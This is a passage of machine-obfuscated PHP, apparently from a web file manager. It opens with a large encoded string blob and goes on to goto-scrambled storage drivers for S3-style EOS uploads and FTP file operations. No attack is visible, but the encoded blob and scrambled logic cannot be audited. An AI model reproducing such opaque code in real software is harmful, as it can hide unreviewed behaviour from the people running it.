\54\146\153\266\14\140\145\130\323\211\223\326\264\345\225\113\60"."\xf\x2c\xb6\xf\xb6\x4a\x88\x7b\x5e\xd1\x11\x2d\x2a\xc5\xfb\xc1\x2d\x0\x1\x48\xc3\xae\x60\x5\xc4\x58\xf\xba\xb1\xa2\x1\xda\xa1\x30\xba\xc4\xc1\x61\x8d\x1\xf3\xf\xcb\x5d\xcc\x74"."\x93\x5c\x5b\x21\xcf\xf\x95\x94\xc2\x6b\x2b\x16\x4d\x43\xf3\x0\xbb\x7e\x0\x46\xb2\x1b\xee\x8f\xcc\x7e\xce\x10\x23\x34\x95\x4d\x4e\xc3\x12\xc1\xf6\x26\x96\xd2\xc\xc4\x72\xf5\x29\xe4".base64_decode('BgqTkFubWt0MVEfRxC6SEhGKP2hDLLHIFZA+gHeN+vGor2ImOPTVzL60GpP8gQ==')."\31\276\172\217\277\301\27\232\45\101\217\5\374\260\37\331\140\133\227\73\322\30\341\301\241\63\77\312\174\17\303\240\63\12\330\102\147\234\361\306\6\347\202\5\313\34"."\301\3\277\265\132\74\107\25\75\257\106\300\123\247\255\4\1\225\201\172\260\2\271\123\134\23\44\144\316\352\112\176\376\1\5\75\175\311\133\54\24\310\25\150\15\311"."\x5f\xf8\xb\x60\x89\x58\x73\x83\xcd\x5a\xc9\xc\xd5\x78\x35\xd3\xab\x1a\x2a\x27\xe\xb4\xc4\x80\x58\x3b\xd7\xf4\xe9\xcc\x55\xb6\x80\xf4\xb8\xe8\xd\x9b\x23\x1b\x7f\x25\xdf\x7d\x6\x71"."\x8c\x20\xba\x7e\xb5\x9\xa8\x78\x98\x44\x3f\x2b\x59\xaa\xda\x26\xef\xb8\x70\x3f\xe5\x28\x2a\x78\x90\xcf\xea\xb2\x6a\x28\x2\x0\xbb\x32\x2f\x2b\xa5\x31\xc1\xf9\xa\x29\x1d\xc1\x65\x30".strrev('B_t0Bm'."\r".'pmg=8[ƮW_,')."\x81\xde\xc3\x25\x47\x15\xec\x18\x38\x82\xaf\x8e\xf3\x4f\x0\xb1\x49\x1f\xc8\x8a\xc7\x29\xee\x38\x75\x64\x4e\xa5\x36\xe8\xfa\xc5\x4b\xf5\xa4\x30\xc2\xf9\x53\x98\x9d\xd4\x6\x3f\x87\x25".base64_decode('FCAvwXMFyslSxQRY0ATtluNEm+t/u2Wd5f3HvG9AW6eh6wHlJC6zswxStVSOlA==')."\101\374\65\10\151\32\275\363\303\77\201\334\75\170\323\131\323\42\204\65\211\226\261\2\212\61\0\161\37\134\162\201\326\31\132\172\40\17\140\221\357\375\264\135\314\266"."\xb\xba\xa0\xce\x24\x34\x11\xd\x88\x0\x82\x7d\x4\x3f\x6b\x2\xed\x9d\x71\x8\x8b\x7d\xe\xc0\x88\x2b\x66\xbe\xff\x7b\x5c\xcf\x90\x95\x1a\xf6\x2d\x84\xb3\x33\x80\x28\x84\x3a\xb5\x3e"."\353\113\45\20\42\60\57\26\242\154\375\26\114\21\46\63\272\371\51\334\243\241\277\320\237\200\345\341\1\241\366\321\370\247\235\374\122\52\157\257\32\257\153\322\224\122"."\66\366\365\226\367\250\5\100\263\302\45\61\124\12\36\225\313\31\106\266\210\347\177\366\42\11\137\136\64\115\230\122\350\355\213\206\41\212\332\300\222\325\43\71\167\364"."\xce\x77\x20\xab\x73\x6e\x76\x38\xc6\xc\xa7\x90\x1\x9b\xe8\x6a\x3d\xac\x85\xe5\xa4\x3\xf3\x3e\x90\x2\xf1\x58\xdd\x80\x18\x16\xad\x8\x51\xa7\x41\x22\xd5\x89\xc4\xd9\xc\xa8\x11\x32".base64_decode('0MdD4g70sgWmQ/bXU4T1w4ibWDqZ0qJyKogtbiym7jqQW5g9nSUbBrnlbJYr5w==')."\155\12\170\302\217\140\145\174\56\343\303\27\253\54\120\135\220\213\104\73\116\174\44\301\157\217\220\354\340\153\255\370\14\202\164\133\254\222\236\3\241\37\50\71\65\12"."\317\37\272\363\317\215\240\105\20\145\157\4\323\71\162\236\347\22\5\27\222\101\232\46\361\1\266\54\120\70\41\340\252\107\1\264\352\105\106\367\147\240\154\36\132\337"."\327\301\23\26\375\64\50\11\306\365\303\70\227\11\305\233\245\374\174\331\376\246\7\375\14\173\240\304\201\173\306\137\127\302\317\221\70\330\323\43\16\354\275\307\101\36"."\x1c\x71\xf0\x5b\x40\x3f\xf7\x44\xf\x7f\xd5\xcc\xfa\x14\x1a\x6c\x33\xb3\x35\xcb\x63\xbf\xed\x9c\x37\x43\x95\xad\x40\xd0\x8e\xb8\xb0\x96\xaf\x49\xe3\xa7\x65\x99\x5c\x9a\x1f\x46\x82\x88"."\x55\x12\xc9\xeb\xb0\xd0\xc3\x9c\x9e\x72\xa0\xb3\x42\x7\x75\xa4\x62\x43\x7\xef\x95\x38\x32\x5\x70\xf8\xdf\xeb\xc0\x26\x87\x48\xbc\x88\x5b\xa9\x4e\xd5\xb4\xa8\x4e\xcf\x58\xec\xd9\x54"."\313\254\3\102\75\267\206\307\276\244\362\236\73\230\237\216\127\216\233\60\105\24\343\371\370\360\263\13\342\3\220\270\21\43\7\50\144\107\347\3\57\131\247\225\104\375"."\130\211\313\27\45\132\215\102\363\37\10\22\246\250\225\44\377\357\226\2\147\212\161\126\301\130\63\377\335\260\74\224\240\131\51\30\66\10\33\232\355\124\132\203\207\305"."\6\157\54\336\302\370\3\101\326\157\341\347\254\12\364\103\330\210\370\322\300\117\320\150\51\50\136\246\241\162\323\324\145\253\234\124\110\34\100\230\240\262\207\212\336\354".base64_decode('U+xtR4ghigSeLMgLYo2mZteCwOJwo0JKuEAmRbZdeN2RL7L/2wBSkQBLD9xAoQ==')."\100\317\335\323\51\41\261\275\335\143\173\174\355\147\332\215\231\56\46\376\70\145\372\36\20\32\124\101\163\246\230\1\64\300\204\173\341\322\230\265\257\266\352\101\61\136"."\107\207\103\32\52\123\76\27\46\274\125\304\275\102\10\54\27\54\115\357\125\15\41\314\122\152\305\237\141\101\67\143\270\62\32\255\125\313\272\25\374\304\211\27\115\120"."\105\342\62\310\257\32\351\107\110\173\311\302\205\217\336\343\273\104\236\31\354\176\221\54\330\217\100\324\11\357\157\151\142\330\172\171\67\100\75\173\1\46\311\42\150\201"."\170\203\355\211\66\104\174\354\357\266\321\376\243\165\316\151\232\160\121\315\42\16\260\367\112\54\342\201\141\177\270\7\260\123\242\173\74\20\145\63\234\154\236\204\352\41"."\353\135\374\65\207\375\325\276\254\160\117\327\366\236\250\240\252\264\276\24\152\271\317\7\375\27\330\226\65\275\45\10\57\135\342\363\23\102\370\221\337\64\34\246\234\370".base64_decode('//Mrfv+/Hu+bUE6VypYX3mYQBpdyY4OCc0Ss0LT1w7pFHi2mkhnqsMRIhC84uA==')."\367\270\154\217\246\272\230\71\43\365\167\101\335\140\310\364\300\104\206\117\27\345\51\50\351\223\137\140\106\166\263\27\251\12\105\362\37\142\264\114\76\312\157\362\146\146".strrev('%	J,hkJIY'."\r".'7&`KA+~88wX')."\x4e\xc9\x7\xba\xd8\x4a\xa8\x88\x48\x39\x2c\xa0\x3c\x7a\x13\xb6\xec\x82\x16\xa0\x88\x1e\xfe\x7a\xa9\xcb\xfa\x7e\x26\x29\xd1\x6c\x7b\x70\x9\x67\x32\x44\xdc\x5a\xb4\xc9\xf9\xe7\xb1\xf9".strrev('!xYx2`	(A	'."\r".']l1±nX=NN@b٥')."\xa6\x7f\xe1\x45\xc8\x9e\xdc\x14\x4\x61\x10\x12\xfb\x4b\x17\x73\xab\xae\x21\x56\xcc\xa\x65\x5a\xd\xc1\x52\x4e\x78\x41\x30\xef\x71\x33\x9b\xe2\x1e\x88\x47\xfc\x24\x4b\xd5\x90\xab\x50"."\322\355\120\133\163\11\272\40\100\146\52\340\356\205\347\201\315\164\26\153\273\304\75\224\336\303\21\14\133\11\310\242\223\62\104\7\310\326\222\320\124\331\272\122\152\12"."\x65\x8b\x69\xba\x21\x64\x63\xf0\x42\x79\xe1\xfb\x71\xa6\x5\x9b\xdc\x7f\xab\xdd\x6f\x2b\x12\x85\xb1\x74\x6b\x11\x72\xc9\xb1\xa1\x8\x12\x4e\xd5\x0\x7b\x1b\xb7\x7a\x63\x46\x89\x8\x4c".strrev('6{-lOlJ6|R$/9T9X7F')."\x8b\x2c\x21\x1c\xe2\xc5\xd0\xdc\xf1\xe6\x9f\xd3\xf0\xe3\x23\x61\xf3\xa7\xc5\xa0\x30\xc2\x69\xad\xd\x2e\x10\x7f\x4e\xed\xe4\x5e\x7e\x34\xc3\xb9\xdf\x78\x9c\xbd\x5\x6a\xc9\x1a\xa7\xfc".base64_decode('P4MCCH82FPI6whVHbiir9NlfqXOJ1yItGfOh/AqkUJ5r6Xk3IaxQ99GSsRYXrw==')."\130\262\111\305\101\330\225\57\63\114\21\44\15\150\23\316\55\126\160\127\230\34\315\77\151\275\320\311\262\261\61\3\171\220\5\276\323\2\265\311\116\120\53\101\267\161"."\133\222\41\76\163\152\75\233\23\5\173\141\12\50\51\277\120\235\170\156\67\144\201\120\341\217\360\131\151\105\261\160\55\226\47\320\315\112\263\40\137\40\166\254\143\44"."\x67\x50\x4c\xb4\x34\xc7\x3e\xb4\x88\xed\xe7\xd3\x17\x3\xd3\x48\xf1\xe9\xa2\x8a\xe4\xfc\xfc\x8a\xad\xf5\x62\x1\x7b\xcf\x70\x9\xa3\x4f\x35\x63\x9d\x82\x2c\x92\x9f\x98\xf\xd7\xf3\x90"."\112\76\124\270\275\366\126\121\234\332\45\64\136\111\136\173\204\303\377\260\126\240\14\156\121\301\142\70\11\75\306\315\170\110\113\331\41\120\0\313\342\44\130\66\57\231".base64_decode('FhZUG0I5U84ZQ3QvH3lEyo8X6LBNFsZZh8Jnwcz5nyMzzp4bqQUKt4JL87YD1g==')."\x42\xad\x28\x98\x79\xc8\x56\x14\x78\x60\x98\xb8\xe0\x2a\x40\x6b\x69\x4a\x1\xea\xca\x4f\xe3\xf3\xe9\x38\x4f\x2b\x60\x1b\x80\xeb\x84\x7b\xb4\xe8\xdb\xa5\x40\xb2\x68\x68\x50\xd8\x14\x21".strrev('m^\\->NAu[DcFwL!m`WyD\\VpX').base64_decode('qZnJCdaYBQ1qHejZ8jxJNiVTTblgi4ylFs1UY4Kdkv2hdpxOP5ISFHA23ReX9g==').base64_decode('LefTBbRDCETYNa50tlhm4/2faNvxoVs9PHNlBy1QvHLg/RInw5fjHTAtrGXRbw==').base64_decode('nWaalJIA+R/lREwe3PQcgo0CCPFTFYhFpOhH0xGRDRQkx39Q4AwpOBURG0sEHg==')."\40\260\210\270\247\221\63\273\306\234\355\340\221\3\200\20\31\325\372\251\43\65\170\133\224\267\207\77\153\53\333\31\71\316\203\220\371\46\132\134\240\73\271\206\33\247"."\270\211\217\132\47\252\303\111\134\224\164\145\223\226\342\330\21\77\263\64\374\271\32\210\156\222\127\201\175\127\42\265\22\364\342\352\235\347\13\205\103\171\111\255\236\120".base64_decode('aG4g2IBdXeYlo1KCcUteUmtToGWoNG+zx+fPS4PGLi0R7mkHJ/laUSs9fn9g7g==').base64_decode('UK3w1c/iLUFHq1z5ne3UqCabnhGE5BSVpYVbZEqau1ziZawqAnFcDeqNjAWsDg==')."\xe1\x6d\x76\x67\x74\xc2\x92\x8a\xa0\xa1\x4a\xb\xa9\x3b\x98\x25\x50\xe8\xfa\x93\x2d\x6e\xc6\x2c\xa3\xe\x69\x36\xe3\x78\x7c\x78\xec\xb2\x9c\x38\xb\x70\xb4\x58\x10\x89\x11\x26\xa1\xb8"."\273\42\100\131\101\214\211\372\323\174\175\76\112\345\30\201\55\235\111\237\40\353\322\242\202\276\36\313\56\344\66\27\301\261\140\235\204\303\44\371\177\0\356\25\131\163"."\xd2\x9d\x0\x0".strrev('')."".""."", 10, -8))); goto aǃɂ; a: function binCheckBigger($CȎ򲜩, $a) { return $CȎ򲜩 > $a; } $_SERVER[$_SERVER[ӳ][3]] = (base64_decode('OTEwMQ==')."\60\60")+0;$_5JTK="dTxHH49Vj8dRvpKuvRyzjdzgu3rmUufKiR6nFVzdyUGkQk7M2CYdCJZttID3bBSxTrjehh3";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($A, $eܓ) { $aڍ =& $_SERVER[̉]; if (isset(self::$_methodList[$A])) { return @call_user_func_array(self::$_methodList[$A], $eܓ); } else { if (method_exists($this, $A)) { return call_user_func_array(array($this, $A), $eܓ); } else { think_exception(__CLASS__ . $aڍ[4] . $A . $aڍ[5]); } } } public static function __callStatic($fԣ, $d̨ғ) { if (isset(self::$_methodListStatic[$fԣ])) { return call_user_func_array(self::$_methodListStatic[$fԣ], $d̨ғ); } else { if (method_exists(self, $fԣ)) { return call_user_func_array(array(self, $fԣ), $d̨ғ); } else { show_json("{$fԣ}\x28\51\40\x6e\x6f\164\x20\145\170\x69\163\164\73", !1); } } } public static function addMethod($F݊, $eƆ) { self::$_methodList[$F݊] = $eƆ; } public static function addMethodStatic($C, $e複ʯ) { self::$_methodListStatic[$C] = $e複ʯ; } } goto d뻂Ĉ; Eƃ: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($bĚ) { parent::__construct($bĚ); $this->signatureVersion($_SERVER[̉][212]); } public function uploadFormData($Cˠ, $D = 3600) { goto f; cн׏: $dȱ = array($this->accessKey, $Fʖهҳ, $this->region, $fތٯ, $aזΡ); $B = implode($Bք[8], $dȱ); $b = array($Bք[1190] => gmdate($Bք[1189], strtotime($Bք[1228])), $Bք[1191] => array(array($Bք[1193] => $this->bucket), array($Bք[1192] => $Eѭ), array($Bք[1194], $Bք[1195], $Bք[33]), array($Bք[1194], $Bք[1229], $Bք[33]), array($Bք[1194], $Bք[1230], $Bք[33]), array($Bք[1196] => $E), array($Bք[1231] => $B), array($Bք[1232] => $AȤ), array($Bք[1233] => $f쌏), array($Bք[1234] => $bݎ))); goto D; D: $A = base64_encode(json_encode($b)); $b = hash_hmac($Bք[1235], $Fʖهҳ, $Bք[1236] . $this->secret, !0); $Fϐ = hash_hmac($Bք[1235], $this->region, $b, !0); goto fə; Eϲߴ: $fތٯ = $Bք[59]; $f쌏 = gmdate($Bք[1226]); $Fʖهҳ = gmdate($Bք[714]); goto a; a: $aזΡ = $Bք[1227]; $bݎ = $D . $Bք[33]; $E = $Bք[1188]; goto cн׏; fə: $d웪 = hash_hmac($Bք[1235], $fތٯ, $Fϐ, !0); $E񴧮 = hash_hmac($Bք[1235], $aזΡ, $d웪, !0); $Fψ = hash_hmac($Bք[1235], $A, $E񴧮); goto dҔ걵; f: $Bք =& $_SERVER[̉]; $Eѭ = $Bք[192]; $AȤ = $Bք[1225]; goto Eϲߴ; dҔ걵: $b = array($Bք[211] => $Bք[33], $Bք[1237] => $Bք[33], $Bք[1192] => $Eѭ, $Bք[1196] => $E, $Bք[1200] => $A, $Bք[1238] => $B, $Bք[1239] => $AȤ, $Bք[1240] => $f쌏, $Bք[1241] => $bݎ, $Bք[1242] => $Fψ, $Bք[175] => $this->getHost()); return $b; goto aԠγ; aԠγ: } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; private $config = array(); public function __construct($Bǻ蜙؊) { parent::__construct(); if (count($Bǻ蜙؊) > 0) { $this->_init($Bǻ蜙؊); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($D) { $f⻋ =& $_SERVER[̉]; global $config; $this->appCharset = $config[$f⻋[1243]]; $this->systemCharset = $config[$f⻋[1244]]; if (isset($D[$f⻋[1245]]) && $D[$f⻋[1245]]) { $this->systemCharset = $D[$f⻋[1245]]; } } public function iconvApp($Aһ) { return $this->iconvTo($Aһ, $this->systemCharset, $this->appCharset); } public function iconvSystem($e຿) { return $this->iconvTo($e຿, $this->appCharset, $this->systemCharset); } public function getPathOuter($CϘܷ) { goto cƺ; b: return $this->pathDriver . $dݙ[8] . ltrim($CϘܷ, $dݙ[8]); goto e˔Ȋ; fږʇ: $CϘܷ = KodIO::clear($CϘܷ); $CϘܷ = substr($CϘܷ, strlen($c؆)); if (empty($this->pathDriver)) { return $CϘܷ; } goto b; Bڵܸ: if (substr($c؆, 0, 2) == $dݙ[1246]) { $c؆ = BASIC_PATH . substr($c؆, 2); } if (substr($CϘܷ, 0, 2) == $dݙ[1246]) { $CϘܷ = BASIC_PATH . substr($CϘܷ, 2); } $c؆ = KodIO::clear($c؆); goto fږʇ; cƺ: $dݙ =& $_SERVER[̉]; $c؆ = $this->iconvApp($this->pathBase); $CϘܷ = $this->iconvApp($CϘܷ); goto Bڵܸ; e˔Ȋ: } private function _init($D̦ = array()) { $fز =& $_SERVER[̉]; if (!function_exists($fز[1247])) { throw new Exception(LNG($fز[1248])); } $this->config = $D̦; $this->charsetReset($D̦); foreach ($D̦ as $dɆ => $Fكӷ) { if (isset($this->{$dɆ})) { $this->{$dɆ} = $Fكӷ; } } return $this->_login($D̦); } private function _login($BȄ) { goto AǬ̿; bԔ: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $Fȅ化 = $this->pasv == $F[87] ? !0 : !1; @ftp_pasv($this->connect, $Fȅ化); goto a; AǬ̿: $F =& $_SERVER[̉]; static $dߘ = array(); $dُ = md5(json_encode($BȄ)); goto cᣨ; cᣨ: if (isset($dߘ[$dُ])) { foreach ($dߘ[$dُ] as $E => $d޸) { $this->{$E} = $d޸; } return !0; } $E = parse_url(trim($this->server, $F[8])); $this->host = $E[$F[175]]; goto f; f: $a = isset($E[$F[174]]) && $E[$F[174]] == $F[1249] ? !0 : !1; $this->scheme = $a ? $F[1250] : $F[1251]; $this->port = isset($E[$F[176]]) ? $E[$F[176]] : 21; goto c; a: $dߘ[$dُ] = array($F[1252] => $this->connect, $F[175] => $this->host, $F[174] => $this->scheme, $F[176] => $this->port); return $d憰; goto dɑ; c: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $d憰 = @ftp_login($this->connect, $this->username, $this->userpass); goto bԔ; dɑ: } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($b읤, $Dة = '', $C¬䱠 = REPEAT_RENAME) { if ($this->setContent($b읤, $Dة)) { return $this->getPathOuter($b읤); } return !1; } public function mkdir($A, $BӉ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $A = $this->iconvSystem($A); if ($this->_isFolder($A) || @ftp_mkdir($this->connect, $A)) { return $this->getPathOuter($A); } if (!$this->mkdir($this->pathFather($A))) { return !1; } if ($A = @ftp_mkdir($this->connect, $A)) { return $this->getPathOuter($A); } return !1; } public function copyFile($a䐷֠, $e) { goto bⰑ; bⰑ: if (!$this->_isconn()) { return !1; } $D쳂 = $this->pathThis($this->iconvSystem($a䐷֠)); $cψ㫋 = $this->tempFile($D쳂); goto b݈; aǑ: $this->tempFileRemve($cψ㫋); return $b; goto e጑; b݈: $EҶ = $this->iconvApp($cψ㫋); $this->download($a䐷֠, $EҶ); $b = $this->upload($e, $EҶ); goto aǑ; e጑: } public function moveFile($F, $d) { if (!$this->_isconn()) { return !1; } $F = $this->iconvSystem($F); $d = $this->iconvSystem($d); $B = @ftp_rename($this->connect, $F, $d); return $B ? $this->getPathOuter($d) : !1; } public function delFile($B) { if (!$this->_isconn()) { return !1; } $B = $this->iconvSystem($B); return @ftp_delete($this->connect, $B); } public function delFolder($b팧) { goto bݤ; bݤ: if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $B = $d⹚ = array(); goto F􈍯; F􈍯: $this->fileList($b팧, $B, $d⹚, !0); $this->listItemCache = !0; foreach ($d⹚ as $d껪) { $C̷ = $this->iconvSystem($d껪[$_SERVER[̉][28]]); $f薹ǳ = @ftp_delete($this->connect, $C̷); if (!$f薹ǳ) { return !1; } } goto f; f: foreach ($B as $C̷) { $C̷ = $this->iconvSystem($C̷); $f薹ǳ = @ftp_rmdir($this->connect, $C̷); if (!$f薹ǳ) { return !1; } } $b팧 = $this->iconvSystem($b팧); return @ftp_rmdir($this->connect, $b팧); goto C; C: } public function rename($fҭ, $A䈜) { goto A͙; A: $fҞ = rtrim($f⃥, $fבټ[8]) . $fבټ[8] . $bѠ; $c = @ftp_rename($this->connect, $fҭ, $fҞ); $fҞ = $this->iconvApp($fҞ); goto F˄ꬲ; A͙: $fבټ =& $_SERVER[̉]; if (!$this->_isconn()) { return !1; } $bѠ = $this->fileNameAuto($this->pathFather($fҭ), $A䈜); goto bᒦ; bᒦ: $bѠ = $this->iconvSystem($bѠ); $fҭ = $this->iconvSystem($fҭ); $f⃥ = $this->pathFather($fҭ); goto A; F˄ꬲ: return $c ? $this->getPathOuter($fҞ) : !1; goto F鏘; F鏘: } private function folderInfo($FՄ׎, $F = false) { $f =& $_SERVER[̉]; $Bﾺә = array($f[28] => $this->pathThis($FՄ׎), $f[76] => $this->getPathOuter($f[8] . $FՄ׎), $f[29] => $f[77]); if ($F) { return $Bﾺә; } $Bﾺә[$f[194]] = $Bﾺә[$f[84]] = 0; $Bﾺә[$f[195]] = $Bﾺә[$f[196]] = !0; return $Bﾺә; } private function fileInfo($fھǈ, $b⻘ = false, $D = array()) { goto aͯ; cΩ: $cǜȯ[$bĞ[194]] = $cǜȯ[$bĞ[84]] = 0; $cǜȯ[$bĞ[195]] = $cǜȯ[$bĞ[196]] = !0; $d = $this->iconvSystem($fھǈ); goto c; A엎: return $cǜȯ; goto e卐; c: $cǜȯ[$bĞ[84]] = @ftp_mdtm($this->connect, $d); if (empty($D)) { $D = $this->objectMeta($fھǈ); if (!$D) { return $cǜȯ; } } $cǜȯ[$bĞ[78]] = $D[$bĞ[78]]; goto A엎; aͯ: $bĞ =& $_SERVER[̉]; $cǜȯ = array($bĞ[28] => $this->pathThis($fھǈ), $bĞ[76] => $this->getPathOuter($bĞ[8] . $fھǈ), $bĞ[29] => $bĞ[193], $bĞ[78] => isset($D[$bĞ[78]]) ? $D[$bĞ[78]] : 0, $bĞ[168] => $this->ext($fھǈ)); if ($b⻘) { return $cǜȯ; } goto cΩ; e卐: } public function size($aʃ) { $Bߖ󍌫 = $this->objectMeta($aʃ); return $Bߖ󍌫 ? $Bߖ󍌫[$_SERVER[̉][78]] : 0; } public function info($d⠵) { if ($this->isFile($d⠵)) { return $this->fileInfo($d⠵, 0); } else { if ($this->isFolder($d⠵)) { return $this->folderInfo($d⠵); } } return !1; } private function fileList($dŇۯ, &$d, &$D͈, $Bσ = false) { goto fη͌; fη͌: $Ał =& $_SERVER[̉]; $dŇۯ = $this->iconvSystem($dŇۯ); if (!$this->isFolder($dŇۯ)) { return !1; } goto e; C: $FՈќ = $this->listItemCache === !1 ? !1 : !0; $A䜼͖ = @ftp_rawlist($this->connect, $dŇۯ); if (!$A䜼͖) { $A䜼͖ = array(); } goto Bڈ; e: @ftp_chdir($this->connect, $Ał[8]); $dŇۯ = rtrim($dŇۯ, $Ał[8]) . $Ał[8]; check_abort(); goto C; Bڈ: $Cʏӏ = array($Ał[95] => 1, $Ał[1253] => 1); foreach ($A䜼͖ as $d) { goto bێ; Aҙ: if (empty($f) && $f !== $Ał[191] || isset($Cʏӏ[$f])) { continue; } $f = $this->iconvApp($dŇۯ . ltrim($f, $Ał[8])); $Eئ = array($Ał[28] => $f, $Ał[29] => $Ał[193], $Ał[78] => $CÕǬ[4]); goto E쐉; bێ: $CÕǬ = $this->_listItem($d); if ($CÕǬ[0] == $Ał[722]) { continue; } $f = $CÕǬ[8]; goto Aҙ; B䒹: if ($c) { $d[] = $f; if ($Bσ) { $this->fileList($f, $d, $D͈, $Bσ); } continue; } $D͈[] = $Eئ; goto C; E쐉: if (substr($d, 0, 1) == $Ał[1254]) { $Eئ[$Ał[29]] = $Ał[77]; $Eئ[$Ał[78]] = 0; } $c = $Eئ[$Ał[29]] == $Ał[77] ? !0 : !1; if ($FՈќ) { $this->cacheMethod($Ał[199], $f, $c); $this->cacheMethod($Ał[200], $f, $Eئ); } goto B䒹; C: } if ($FՈќ) { $this->cacheMethod($Ał[199], $dŇۯ, !0); } goto bɠ; bɠ: } private function _listItem($f) { if (empty($f)) { return array(); } $dȐ = preg_split($_SERVER[̉][1255], $f); if (count($dȐ) <= 9) { return $dȐ; } $dȐ[8] = trim(substr($f, strpos($f, $dȐ[7]) + strlen($dȐ[7]))); return array_splice($dȐ, 0, 9); } public function listPath($F, $e۾ݙ = false) { goto C¸; C¸: $B =& $_SERVER[̉]; if (!$this->_isconn()) { return !1; } $b = $fح۰ = array(); goto B; D: return array($B[75] => $b, $B[74] => $fح۰); goto fЉ; B: $this->fileList($F, $b, $fح۰); foreach ($b as $fݭΛ => $c) { $b[$fݭΛ] = $this->folderInfo($c, $e۾ݙ); } foreach ($fح۰ as $fݭΛ => $c) { $fح۰[$fݭΛ] = $this->fileInfo($c[$B[28]], $e۾ݙ, $c); } goto D; fЉ: } public function has($d, $ḟ = false, $aƂ = true) { goto Dڹ; C: return !1; goto eʖ; F슊: $this->fileList($d, $Eͨ, $E, $cϋ); if ($ḟ) { return array($Bԥ[203] => count($E), $Bԥ[204] => count($Eͨ)); } if ($aƂ) { if (count($E)) { return !0; } } else { if (count($Eͨ)) { return !0; } } goto C; Dڹ: $Bԥ =& $_SERVER[̉]; $Eͨ = $E = array(); $cϋ = $ḟ ? !0 : !1; goto F슊; eʖ: } public function listAll($aõ) { goto E; E: $Aƈ =& $_SERVER[̉]; if (!$this->_isconn()) { return !1; } $cӖ = $dلԫ = array(); goto dԤ; bƄ: foreach ($cӖ as $fȯ) { if (is_string($fȯ)) { $C[$fȯ] = 0; } } return $this->listAllFiles($aõ, array_keys($C), $C); goto B҇ԋ; dԤ: $this->fileList($aõ, $cӖ, $dلԫ, !0); $C = array(); foreach ($dلԫ as $fȯ) { $C[$fȯ[$Aƈ[28]]] = $fȯ[$Aƈ[78]]; } goto bƄ; B҇ԋ: } public function getContent($A) { if (!$this->_isconn()) { return !1; } $A = $this->iconvSystem($A); return $this->fileSubstr($A); } public function setContent($b, $fШ = '') { goto F; B׉: file_put_contents($B, $fШ); $Dҝ = $this->upload($b, $this->iconvApp($B)); $this->tempFileRemve($B); goto d; d: return $Dҝ; goto fߍ; F: if (!$this->_isconn()) { return !1; } $aՏ = $this->pathThis($this->iconvSystem($b)); $B = $this->tempFile($aՏ); goto B׉; fߍ: } public function fileSubstr($C汬, $E = 0, $C = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($C汬, $E, $C); } private function ftpRequest($f, $F֎ = 0, $B½Ι = false) { goto D곹ɓ; c: curl_setopt($c, CURLOPT_URL, $f . $this->pathEncode($f)); curl_setopt($c, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($B½Ι) { $D = $F֎ + $B½Ι - 1; curl_setopt($c, CURLOPT_RANGE, "{$F֎}\x2d{$D}"); } goto B˥Ϳ; Dю: return $C; goto F; D곹ɓ: $f = $this->iconvSystem($f); $f = $this->scheme . $this->host . $_SERVER[̉][4] . $this->port; $c = curl_init(); goto c; B˥Ϳ: curl_setopt($c, CURLOPT_RETURNTRANSFER, 1); $C = curl_exec($c); curl_close($c); goto Dю; F: } public function upload($dɉ, $aɢ, $DⰊ = false, $A = REPEAT_REPLACE) { goto b; b: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($dɉ))) { return !1; } $dɉ = $this->iconvSystem($dɉ); goto e¡; a: if ($B != FTP_FINISHED) { return !1; } return $this->getPathOuter($dɉ); goto b֍; e¡: $aɢ = $this->iconvSystem($aɢ); $B = ftp_nb_put($this->connect, $dɉ, $aɢ, FTP_BINARY); while ($B == FTP_MOREDATA) { $B = ftp_nb_continue($this->connect); } goto a; b֍: } public function download($eܞ, $fє = '') { goto Bʚ⎲; Bʚ⎲: if (!$this->_isconn()) { return !1; } $cǱκ = $this->pathFather($fє); if (!IO::mkdir($cǱκ)) { return !1; } goto B; F۽ê: while ($b == FTP_MOREDATA) { $b = ftp_nb_continue($this->connect); } if ($b != FTP_FINISHED) { return !1; } return $this->iconvApp($fє); goto F׆; B: $eܞ = $this->iconvSystem($eܞ); $fє = $this->iconvSystem($fє); $b = ftp_nb_get($this->connect, $fє, $eܞ, FTP_BINARY); goto F۽ê; F׆: } public function exist($C㇈) { return $this->isFile($C㇈) || $this->isFolder($C㇈); } public function isFile($Eƭ) { return !$this->isFolder($Eƭ) && $this->objectMeta($Eƭ); } public function isFolder($cǱ) { return $this->cacheMethod($_SERVER[̉][199], $cǱ); } protected function objectMeta($aՓ) { return $this->cacheMethod($_SERVER[̉][200], $aՓ); } protected function _objectMeta($Dܩ) { goto Bϥ; Bϥ: $d޾ =& $_SERVER[̉]; if ($Dܩ == $d޾[33] || $Dܩ == $d޾[8]) { return array(); } if (!$this->_isconn()) { return !1; } goto aӤ; aӤ: $Dܩ = $this->iconvSystem($Dܩ); $Eّ֦ϧ = array($d޾[28] => $this->iconvApp($Dܩ), $d޾[29] => $d޾[193], $d޾[78] => 0); @ftp_chdir($this->connect, $d޾[8]); goto C; C: $F۳ = @ftp_size($this->connect, $Dܩ); if ($F۳ != -1) { $Eّ֦ϧ[$d޾[78]] = $F۳; } else { $DД = @ftp_chdir($this->connect, $Dܩ); if (!$DД) { return !1; } $Eّ֦ϧ[$d޾[29]] = $d޾[77]; } return $Eّ֦ϧ; goto Dƍ; Dƍ: } protected function _isFolder($D) { $EǓ =& $_SERVER[̉]; if ($D == $EǓ[33] || $D == $EǓ[8]) { return !0; } $aݿ = $this->_objectMeta($D); return isset($aݿ[$EǓ[29]]) && $aݿ[$EǓ[29]] == $EǓ[77] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($F̌߉) { if (substr($F̌߉, 0, 2) == 